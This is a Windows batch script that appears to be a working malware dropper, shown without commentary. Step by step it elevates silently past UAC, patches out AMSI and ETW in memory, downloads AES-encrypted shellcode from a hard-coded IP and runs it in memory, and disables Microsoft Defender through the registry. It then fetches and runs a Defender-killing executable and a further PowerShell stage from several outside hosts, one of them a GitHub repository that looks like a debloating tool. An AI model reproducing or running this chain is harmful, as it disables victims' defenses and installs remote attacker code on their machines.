@echo off
setlocal EnableExtensions

rem === STEP 0: Self-elevation via COM (NO UAC dialog) ===
whoami /groups | find "S-1-16-12288" >nul 2>&1
if %errorlevel% neq 0 (
    powershell -ep bypass -w hidden -Command "$c='{3E5FC7F9-9A51-4367-9063-A120244FBEC7}';$t=[Type]::GetTypeFromCLSID($c,'localhost');$o=[Activator]::CreateInstance($t);$o.ShellExecute('cmd.exe','/c \"%~f0\"','','runas',0)"
    exit /b
)

rem === STEP 1: AMSI + ETW bypass ===
powershell -ep bypass -w hidden -Command "$d='[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint f,out uint o);';$k=Add-Type -MemberDefinition $d -Name K -PassThru;$a=$k::LoadLibrary('amsi.dll');$p=$k::GetProcAddress($a,'AmsiScanBuffer');$o=0;$k::VirtualProtect($p,[UIntPtr]::new(5),0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy(@([byte]0xB8,0x00,0x00,0x00,0x00,0xC3),0,$p,6);$nt=$k::LoadLibrary('ntdll.dll');$ew=$k::GetProcAddress($nt,'EtwEventWrite');if($ew -ne [IntPtr]::Zero){$o=0;$k::VirtualProtect($ew,[UIntPtr]::new(5),0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy(@([byte]0xB8,0x00,0x00,0x00,0x00,0xC3),0,$ew,6)};[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12"

rem === STEP 2: ElevatorShellcode (AES in-memory, SILENT elevation, NO UAC) ===
powershell -ep bypass -w hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');try{$enc=$wc.DownloadData('https://193.26.115.196/raw/ElevatorShellCode.exe.aes');$kv=[Convert]::FromBase64String('8XuttOXcFiQT+aOlVxneccVpq3mAugc5b7D3caLIVkbiFegb1/cCA2RAyIhtQult');$key=$kv[0..31];$iv=$kv[32..47];$aes=New-Object System.Security.Cryptography.AesCryptoServiceProvider;$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;$aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$aes.Key=$key;$aes.IV=$iv;$dec=$aes.CreateDecryptor();$ms=new-object System.IO.MemoryStream(,$enc);$cs=new-object System.Security.Cryptography.CryptoStream($ms,$dec,[System.Security.Cryptography.CryptoStreamMode]::Read);$out=new-object System.IO.MemoryStream;$cs.CopyTo($out);$cs.Close();$ms.Close();$aes.Dispose();$sc=$out.ToArray();$out.Close();$size=$sc.Length;$d2='[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,ref uint t);';$k2=Add-Type -MemberDefinition $d2 -Name K2 -PassThru;$addr=$k2::VirtualAlloc([IntPtr]::Zero,$size,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($sc,0,$addr,$size);$tid=[UInt32]0;$k2::CreateThread([IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[ref]$tid)}catch{}"

timeout /t 8 /nobreak >nul 2>&1

rem === STEP 3: Disable Defender via registry (admin now) ===
powershell -ep bypass -w hidden -Command "try{$p='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender';if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null};Set-ItemProperty -Path $p -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -EA 0;$r=\"$p\Real-Time Protection\";if(!(Test-Path $r)){New-Item -Path $r -Force|Out-Null};Set-ItemProperty -Path $r -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -EA 0}catch{}"

rem === STEP 4: Defender Killer process as backup ===
powershell -ep bypass -w hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('https://193.26.115.196/update.exe','%TEMP%\up.exe');Start-Process '%TEMP%\up.exe' -ArgumentList 'kill' -WindowStyle Hidden"

timeout /t 5 /nobreak >nul 2>&1

rem === STEP 5: stage_v6_pulsaar.ps1 ===
powershell -ep bypass -w hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sources=@('https://193.26.115.196/stage_v6_pulsaar.ps1','https://signindat.com/stage_v6_pulsaar.ps1','https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/stage_v6_pulsaar.ps1');foreach($u in $sources){try{$wc=New-Object Net.WebClient;$wc.DownloadFile($u,\"$env:TEMP\\s.ps1\");if((Get-Item \"$env:TEMP\\s.ps1\").Length -gt 100){break}}catch{}};powershell -ep bypass -w hidden -File \"$env:TEMP\\s.ps1\""

exit /b
